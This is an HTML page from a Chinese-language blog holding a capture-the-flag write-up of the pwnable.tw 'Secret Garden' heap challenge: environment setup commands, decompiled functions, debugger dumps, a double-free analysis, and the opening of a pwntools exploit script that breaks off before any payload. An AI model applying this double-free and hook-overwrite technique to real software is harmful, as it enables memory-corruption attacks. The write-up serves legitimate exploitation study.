@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="Pwnable.tw-Secret Garden
+Author
+
+libcglibc all in one 中沒有 2.23-0ubuntu5所以去網路上找libchttps://launchpad.net/ubuntu/xenial/amd64/libc6/2.23-0ubuntu5
+把i386載"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="Naup堇姬"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="Pwnable-secret garden"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="Pwnable.tw-Secret Garden
+Author
+
+libcglibc all in one 中沒有 2.23-0ubuntu5所以去網路上找libchttps://launchpad.net/ubuntu/xenial/amd64/libc6/2.23-0ubuntu5
+把i386載"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="http://example.com/img/bg4.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="http://example.com/img/bg4.jpg"/>
+
+
+<!-- Title -->
+
+<title>Pwnable-secret garden | 堇姬 Naup&#39;s Blog</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/icon.jpg"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/bg4.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>Pwnable-secret garden</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2024-09-21
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <h1 id="Pwnable-tw-Secret-Garden"><a href="#Pwnable-tw-Secret-Garden" class="headerlink" title="Pwnable.tw-Secret Garden"></a>Pwnable.tw-Secret Garden</h1><blockquote>
+<p>Author</p>
+</blockquote>
+<h2 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h2><p>glibc all in one 中沒有 2.23-0ubuntu5<br>所以去網路上找libc<br><a target="_blank" rel="noopener" href="https://launchpad.net/ubuntu/xenial/amd64/libc6/2.23-0ubuntu5">https://launchpad.net/ubuntu/xenial/amd64/libc6/2.23-0ubuntu5</a></p>
+<p>把i386載下來</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -X libc6_2.23-0ubuntu5_amd64.deb .</span><br></pre></td></tr></table></figure>
+<p>在libs裡面就有ld跟libc了</p>
+<p>patchelf直接patch上去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ld-2.23.so seethefile</span><br><span class="line">patchelf --replace-needed libc.so.6 ./libc-2.23.so seethefile</span><br></pre></td></tr></table></figure>
+
+<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  bin_init(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, v3, <span class="number">4uLL</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)strtol(v3, <span class="number">0LL</span>, <span class="number">10</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        create();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        clean();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;See you next time.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>總共有五個功能</p>
+<h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *flower; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *name_chunk; <span class="comment">// rbp</span></span><br><span class="line">  _QWORD *v2; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> size[<span class="number">9</span>]; <span class="comment">// [rsp+4h] [rbp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;size[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  size[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( cnt &gt; <span class="number">0x63</span>u )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;The garden is overflow&quot;</span>);</span><br><span class="line">  flower = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">  *flower = <span class="number">0LL</span>;</span><br><span class="line">  flower[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  flower[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  flower[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  flower[<span class="number">4</span>] = <span class="number">0LL</span>;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Length of the name :&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%u&quot;</span>, size) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  name_chunk = <span class="built_in">malloc</span>((<span class="type">unsigned</span> <span class="type">int</span>)size[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !name_chunk )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Alloca error !!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;The name of flower :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name_chunk, (<span class="type">unsigned</span> <span class="type">int</span>)size[<span class="number">0</span>]);</span><br><span class="line">  flower[<span class="number">1</span>] = name_chunk;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;The color of the flower :&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%23s&quot;</span>, flower + <span class="number">2</span>);</span><br><span class="line">  *(_DWORD *)flower = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( heap_arr[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = &amp;heap_arr[<span class="number">1</span>];</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( *v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v3;</span><br><span class="line">      ++v2;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">100</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  heap_arr[v3] = flower;</span><br><span class="line">LABEL_13:</span><br><span class="line">  ++cnt;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Successful !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>會先malloc一塊0x28大小的chunk(簡稱flower chunk)，並初始化該chunk為0<br>再來讀取size，並malloc(size)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x58f085d47470</span>      <span class="number">0x0</span>                 <span class="number">0x30</span>                 Used                None              None</span><br><span class="line"><span class="number">0x58f085d474a0</span>      <span class="number">0x0</span>                 <span class="number">0x50</span>                 Used                None              None</span><br></pre></td></tr></table></figure>
+
+<p>先看flower chunk的內部</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x58f085d47470</span><br><span class="line">0x58f085d47470:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x58f085d47480:	0x0000000000000001	0x000058f085d474b0 // 指向下一塊chunk data 那部分存name</span><br><span class="line">0x58f085d47490:	0x0000000000646464	0x0000000000000000 // 存 color</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+4h] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !cnt )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No flower in the garden&quot;</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Which flower do you want to remove from the garden:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">0x63</span> &amp;&amp; (v1 = (_DWORD *)heap_arr[idx]) != <span class="number">0LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *v1 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(heap_arr[idx] + <span class="number">8LL</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Successful&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>會去free name chunk<br>他會去檢查heap_arr是否為空<br>free完後會把 heap_arr所指向的 flower chunk設為0<br>這邊有double free，因為他沒有把heap_arr清空</p>
+<h3 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">clean</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rbx</span></span><br><span class="line">  _DWORD *v1; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = qword_202040;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (_DWORD *)*v0;</span><br><span class="line">    <span class="keyword">if</span> ( *v0 &amp;&amp; !*v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(v1);</span><br><span class="line">      *v0 = <span class="number">0LL</span>;</span><br><span class="line">      --unk_202024;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 != &amp;qword_202040[<span class="number">100</span>] );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>當name被刪掉的話，會去free flower chunk</p>
+<h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202024 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v1 = qword_202040[v0];</span><br><span class="line">      <span class="keyword">if</span> ( v1 &amp;&amp; *(_DWORD *)v1 )</span><br><span class="line">      &#123;</span><br><span class="line">        __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Name of the flower[%u] :%s\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v0, *(<span class="type">const</span> <span class="type">char</span> **)(v1 + <span class="number">8</span>));</span><br><span class="line">        LODWORD(v1) = __printf_chk(</span><br><span class="line">                        <span class="number">1LL</span>,</span><br><span class="line">                        <span class="string">&quot;Color of the flower[%u] :%s\n&quot;</span>,</span><br><span class="line">                        (<span class="type">unsigned</span> <span class="type">int</span>)v0,</span><br><span class="line">                        (<span class="type">const</span> <span class="type">char</span> *)(qword_202040[v0] + <span class="number">16LL</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      ++v0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v0 != <span class="number">100</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;No flower in the garden !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>上述提到有double free，有任意寫，那目前難點就是leak libc，因為是2.23，leak libc後就可以直接改malloc hook或free hook</p>
+<p>那就開排heap吧<br>我們可以任意malloc一塊任意大小的chunk，用unsorted bin，來leak libc，因為我們可以任意控name chunk，他malloc只會清掉flower chunk，所以想辦法malloc回來就可以leak libc </p>
+<p>當初沒有注意到name chunk不會清空，以為flower跟name chunk都會被清空，所以想要利用unlink的方式將chunk推到他清空的範圍外(把flower chunk清空0~4當成name chunk)，後來發現不用那麼複雜www</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./secretgarden&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc chall.pwnable.tw 10203&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># main_offset = 0x1048</span></span><br><span class="line">NAUPINFO(<span class="string">&#x27;main offset&#x27;</span>,<span class="number">0x1048</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### heap I/O</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">name_size, name, color</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Length of the name :&#x27;</span>,<span class="built_in">str</span>(name_size).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;The name of flower :&#x27;</span>,name)</span><br><span class="line">    sla(<span class="string">b&#x27;The color of the flower :&#x27;</span>,color)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Which flower do you want to remove from the garden:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice : &#x27;</span>,<span 